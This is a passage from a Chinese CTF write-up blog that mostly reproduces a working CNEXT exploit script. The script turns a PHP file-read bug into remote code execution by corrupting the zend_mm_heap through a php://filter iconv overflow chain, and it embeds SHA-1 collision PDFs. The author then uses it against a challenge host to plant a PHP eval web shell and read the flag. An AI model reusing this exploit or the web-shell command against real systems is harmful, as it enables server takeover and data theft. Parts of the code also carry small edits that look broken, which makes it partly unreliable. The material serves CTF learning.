class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure>

<pre><code>Tweak it to fit your target, and start the exploit.
&quot;&quot;&quot;

def __init__(self, url: str) -&gt; None:
    self.url = url
    self.session = Session()

def send(self, path: str) -&gt; Response:
    post_1 = b&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&quot;
    post_2 = b&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&quot;
    payload = b&quot;one=&quot; + post_1 + b&quot;&amp;two=&quot; + post_2
    headers = &#123;
        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
    &#125;
    path = quote(path)
    print(self.url)
    return self.session.post(url=f&#39;&#123;self.url&#125;+?str=z&amp;comment=__HALT_COMPILER()&amp;one=1&amp;two=2&amp;three=3&#39;,
                             data=payload.decode() + f&#39;&amp;file=&#123;path&#125;&#39;, headers=headers)
    # data=payload,
    # headers=headers)
    # return self.session.get(self.url)

def download(self, path: str) -&gt; bytes:
    &quot;&quot;&quot;Returns the contents of a remote file.
    &quot;&quot;&quot;
    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
    response = self.send(path)
    print(response.text)
    data = response.re.search(b&quot;\&lt;\/code\&gt;(.*)&quot;, flags=re.S).group(1)
    return base64.decode(data)
</code></pre>
<p>@entry<br>@arg(“url”, “Target URL”)<br>@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>@arg(“sleep_time”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>@arg(<br>    “pad”,<br>    “Number of 0x100 chunks to pad with. If the website makes a lot of heap “<br>    “operations with this size, increase this. Defaults to 20.”,<br>)<br>@dataclass<br>class Exploit:<br>    “””CNEXT exploit: RCE using a file read primitive in PHP.”””</p>
<pre><code>url: str
command: str
sleep: int = 1
heap: str = None
pad: int = 20

def __post_init__(self):
    self.remote = Remote(self.url)
    self.log = logger(&quot;EXPLOIT&quot;)
    self.info = &#123;&#125;
    self.heap = self.heap and int(self.heap, 16)

def check_vulnerable(self) -&gt; None:
    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
    wrappers and filters that the exploit needs.
    &quot;&quot;&quot;

    def safe_download(path: str) -&gt; bytes:
        try:
            return self.remote.download(path)
        except ConnectionError:
            failure(&quot;Target not [b]reachable[/] ?&quot;)

    def check_token(text: str, path: str) -&gt; bool:
        result = safe_download(path)
        return text.encode() == result

    text = tf.random.string(12).encode()
    base64 = b64(text, misalign=False).decode()
    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;

    result = safe_download(path)

    if text not in result:
        msg_failure(&quot;Remote.download did not return the test string&quot;)
        print(&quot;--------------------&quot;)
        print(f&quot;Expected test string: &#123;text&#125;&quot;)
        print(f&quot;Got: &#123;result&#125;&quot;)
        print(&quot;--------------------&quot;)
        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]data://[/] wrapper works&quot;)

    text = tf.random.string(12)
    base64 = b64(text.encode(), misalign=False).decode()
    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
    if not check_token(text, path):
        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)

    text = tf.random.string(12)
    base64 = b64(compress(text.encode()), misalign=True).decode()
    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;

    if not check_token(text, path):
        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)

    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)

    msg_success(&quot;Exploit preconditions are satisfied&quot;)

def get_file(self, path: str) -&gt; bytes:
    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
        return self.remote.download(path)

def get_regions(self) -&gt; list[Region]:
    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
    maps = self.get_file(&quot;/proc/self/maps&quot;)
    maps = maps.decode()
    PATTERN = re.compile(
        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
    )
    regions = []
    for region in table.split(maps, strip=True):
        if match := PATTERN.match(region):
            start = int(match.group(1), 16)
            stop = int(match.group(2), 16)
            permissions = match.group(3)
            path = match.group(4)
            if &quot;/&quot; in path or &quot;[&quot; in path:
                path = path.rsplit(&quot; &quot;, 1)[-1]
            else:
                path = &quot;&quot;
            current = Region(start, stop, permissions, path)
            regions.append(current)
        else:
            print(maps)
            failure(&quot;Unable to parse memory mappings&quot;)

    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)

    return regions

def get_symbols_and_addresses(self) -&gt; None:
    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
    regions = self.get_regions()

    LIBC_FILE = &quot;\cnext-libc&quot;

    # PHP&#39;s heap

    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)

    # Libc

    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)

    self.download_file(libc.path, LIBC_FILE)

    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
    self.info[&quot;libc&quot;].address = libc.start

def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
    for region in regions:
        if any(name in region.path for name in names):
            break
    else:
        failure(&quot;Unable to locate region&quot;)

    return region

# def download_file(self, remote_path: str, local_path: str) -&gt; None:
#     &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
#     data = self.get_file(remote_path)
#     Path(local_path).write(data)

import os

def download_file(self, remote_path: str, local_path: str) -&gt; None:
    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
    data = self.get_file(remote_path)
    # 使用 os.path 替代 Path
    local_path = os.path.normpath(local_path)
    with open(local_path, &#39;wb&#39;) as file:
        file.write(data)

def find_main_heap(self, regions: list[Region]) -&gt; Region:
    # Any anonymous RW region with a size superior to the base heap size is a
    # candidate. The heap is at the bottom of the region.
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == &quot;rw-p&quot;
        and region.size &gt;= HEAP_SIZE
        and region.stop &amp; (HEAP_SIZE - 1) == 0
        and region.path == &quot;&quot;
    ]

    if not heaps:
        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)

    first = heaps[0]

    if len(heaps) &gt; 1:
        heaps = &quot;, &quot;.join(map(hex, heaps))
        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
    else:
        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)

    return first

def run(self) -&gt; None:
    self.check_vulnerable()
    self.get_symbols_and_addresses()
    self.exploit()

def build_exploit_path(self) -&gt; str:
    &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the
    other. Processing generally involves making some kind of operation either
    on the chunk or in a destination chunk of the same size. Each operation is
    applied on every single chunk; you cannot make PHP apply iconv on the first 10
    chunks and leave the rest in place. That&#39;s where the difficulties come from.

    Keep in mind that we know the address of the main heap, and the libraries.
    ASLR/PIE do not matter here.

    The idea is to use the bug to make the freelist for chunks of size 0x100 point
    lower. For instance, we have the following free list:

    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00

    By triggering the bug from chunk ..900, we get:

    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???

    That&#39;s step 3.

    Now, in order to control the free list, and make it point whereever we want,
    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
    That&#39;s step 2.

    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have
    a problem: after step2 has been processed, the free list goes bottom-up, like:

    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900

    We need to go the other way around. That&#39;s why we have step 1: it just allocates
    chunks. When they get freed, they reverse the free list. Now step2 allocates in
    reverse order, and therefore after step2, chunks are in the correct order.

    Another problem comes up.

    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
    Since step2 creates chunks that contain pointers and pointers are generally not
    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
    To avoid this, we put the chunks in step2 at the very end of the chain, and
    prefix them with `0\n`. When dechunked (right before the iconv), they will
    &quot;disappear&quot; from the chain, preserving them from the character set conversion
    and saving us from an unwanted processing error that would stop the processing
    chain.

    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
    don&#39;t know the precise layout of the heap, but we know that at the top of the
    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
    Its free_slot[] array contains a pointer to each free list. By overwriting it,
    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
    field contains pointers to hook functions for emalloc, efree, and erealloc
    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
    then overwrite the use_custom_heap flag to make PHP use these function pointers
    instead. We can now do our favorite CTF technique and get a call to
    system(&lt;chunk&gt;).
    We make sure that the &quot;system&quot; command kills the current process to avoid other
    system() calls with random chunk data, leading to undefined behaviour.

    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
    process is in a random state, we still get contiguous, in order chunks for our
    exploit.

    Therefore, the whole process described here CANNOT crash. Everything falls
    perfectly in place, and nothing can get in the middle of our allocations.
    &quot;&quot;&quot;

    LIBC = self.info[&quot;libc&quot;]
    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]

    ADDR_HEAP = self.info[&quot;heap&quot;]
    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

    CS = 0x100

    # Pad needs to stay at size 0x100 at every step
    pad_size = CS - 0x18
    pad = b&quot;\x00&quot; * pad_size
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = compressed_bucket(pad)

    step1_size = 1
    step1 = b&quot;\x00&quot; * step1_size
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, CS)
    step1 = compressed_bucket(step1)

    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;

    step2_size = 0x48
    step2 = b&quot;\x00&quot; * (step2_size + 8)
    step2 = chunked_chunk(step2, CS)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3_size = CS

    step3 = b&quot;\x00&quot; * step3_size
    assert len(step3) == CS
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
    assert len(step3_overflow) == CS
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4_size = CS
    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    # This chunk will eventually overwrite mm_heap-&gt;free_slot
    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
    step4_pwn = ptr_bucket(
        0x200000,
        0,
        # free_slot
        0,
        0,
        ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=CS,
    )

    step4_custom_heap = ptr_bucket(
        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
    )

    step4_use_custom_heap_size = 0x140

    COMMAND = self.command
    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
    if self.sleep:
        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
    COMMAND = COMMAND.encode() + b&quot;\x00&quot;

    assert (
            len(COMMAND) &lt;= step4_use_custom_heap_size
    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)

    step4_use_custom_heap = COMMAND
    step4_use_custom_heap = qpe(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

    pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
    )

    resource = compress(compress(pages))
    resource = b64(resource)
    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;

    filters = [
        # Create buckets
        &quot;zlib.inflate&quot;,
        &quot;zlib.inflate&quot;,

        # Step 0: Setup heap
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,

        # Step 1: Reverse FL order
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,

        # Step 2: Put fake pointer and make FL order back to normal
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,

        # Step 3: Trigger overflow
        &quot;dechunk&quot;,
        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,

        # Step 4: Allocate at arbitrary address and change zend_mm_heap
        &quot;convert.quoted-printable-decode&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,
    ]
    filters = &quot;|&quot;.join(filters)
    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;

    return path

@inform(&quot;Triggering...&quot;)
def exploit(self) -&gt; None:
    path = self.build_exploit_path()
    start = time.time()

    try:
        self.remote.send(path)
    except (ConnectionError, ChunkedEncodingError):
        pass

    msg_print()

    if not self.sleep:
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
    elif start + self.sleep &lt;= time.time():
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
    else:
        # Wrong heap, maybe? If the exploited suggested others, use them!
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)

    msg_print()
</code></pre>
<p>def compress(data) -&gt; bytes:<br>    “””Returns data suitable for <code>zlib.inflate</code>.<br>    “””<br>    # Remove 2-byte header and 4-byte checksum<br>    return zlib.compress(data, 9)[2:-4]</p>
<p>def b64(data: bytes, misalign&#x3D;True) -&gt; bytes:<br>    payload &#x3D; base64.encode(data)<br>    if not misalign and payload.endswith(“&#x3D;”):<br>        raise ValueError(f”Misaligned: {data}”)<br>    return payload.encode()</p>
<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>    “””Returns a chunk of size 0x8000 that, when dechunked, returns the data.”””<br>    return chunked_chunk(data, 0x8000)</p>
<p>def qpe(data: bytes) -&gt; bytes:<br>    “””Emulates quoted-printable-encode.<br>    “””<br>    return “”.join(f”&#x3D;{x:02x}” for x in data).upper().encode()</p>
<p>def ptr_bucket(*ptrs, size&#x3D;None) -&gt; bytes:<br>    “””Creates a 0x8000 chunk that reveals pointers after every step has been ran.”””<br>    if size is not None:<br>        assert len(ptrs) * 8 &#x3D;&#x3D; size<br>    bucket &#x3D; b””.join(map(p64, ptrs))<br>    bucket &#x3D; qpe(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; compressed_bucket(bucket)</p>
<pre><code>return bucket
</code></pre>
<p>def chunked_chunk(data: bytes, size: int &#x3D; None) -&gt; bytes:<br>    “””Constructs a chunked representation of the given chunk. If size is given, the<br>    chunked representation has size <code>size</code>.<br>    For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>    “””<br>    # The caller does not care about the size: let’s just add 8, which is more than<br>    # enough<br>    if size is None:<br>        size &#x3D; len(data) + 8<br>    keep &#x3D; len(data) + len(b”\n\n”)<br>    size &#x3D; f”{len(data):x}”.rjust(size - keep, “0”)<br>    return size.encode() + b”\n” + data + b”\n”</p>
<p>@dataclass<br>class Region:<br>    “””A memory region.”””</p>
<pre><code>start: int
stop: int
permissions: str
path: str

@property
def size(self) -&gt; int:
    return self.stop - self.start
</code></pre>
<p>Exploit()</p>
<pre><code>
kali执行命令 

`python3 cne.py http://node7.anna.nssctf.cn:21532/ &quot;echo &#39;&lt;?php @eval(\$_POST[\&quot;cmd\&quot;]);?&gt;&#39; &gt; 22.php&quot;`

![QQ_1744033106714](/images/QQ_1744033106714.png)

访问22.php 写入木马成功

![image-20250407214134343](/images/image-20250407214134343.png)

终端读取flag 呵呵喜欢藏flag

![image-20250407214646024](/images/image-20250407214646024.png)

用 `find / -name *flag*`    找到可疑目录  /1/1/4/5/1/4/flag

![image-20250407214743434](/images/image-20250407214743434.png)

读取 成功得到flag
</code></pre>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/04/06/Sql-labs%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="prev" title="Sql-labs部分题解">
      <i class="fa fa-chevron-left"></i> Sql-labs部分题解
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#hack-the-world"><span class="nav-number">1.</span> <span class="nav-text">hack_the_world!</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#flask%E4%BC%AA%E9%80%A0"><span class="nav-number">1.0.1.</span> <span class="nav-text">flask伪造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSTI"><span class="nav-number">1.0.2.</span> <span class="nav-text">SSTI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E6%98%AF%E8%B0%81%E7%9A%84%E8%8F%9C%E9%B8%9F%EF%BC%8C%E5%8F%88%E6%98%AF%E8%B0%81%E7%9A%84%E4%BD%AC%E5%A4%A7"><span class="nav-number">2.</span> <span class="nav-text">你是谁的菜鸟，又是谁的佬大</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E4%B9%9F%E6%98%AF%E8%BF%B7%E5%AE%AB%E9%AB%98%E6%89%8B%E5%90%97"><span class="nav-number">2.1.</span> <span class="nav-text">你也是迷宫高手吗</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84PHP"><span class="nav-number">3.</span> <span class="nav-text">简单的PHP</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Sauy"
      src="/images/2.png">
  <p class="site-author-name" itemprop="name">Sauy</p>
  <div class="site-description" itemprop="description">World belongs to us.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://space.bilibili.com/415414982?spm_id_from=333.1387.0.0" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;415414982?spm_id_from&#x3D;333.1387.0.0" rel="noopener" target="_blank"><i class="tv-retro fa-fw"></i>Bilibili</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Sauy</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
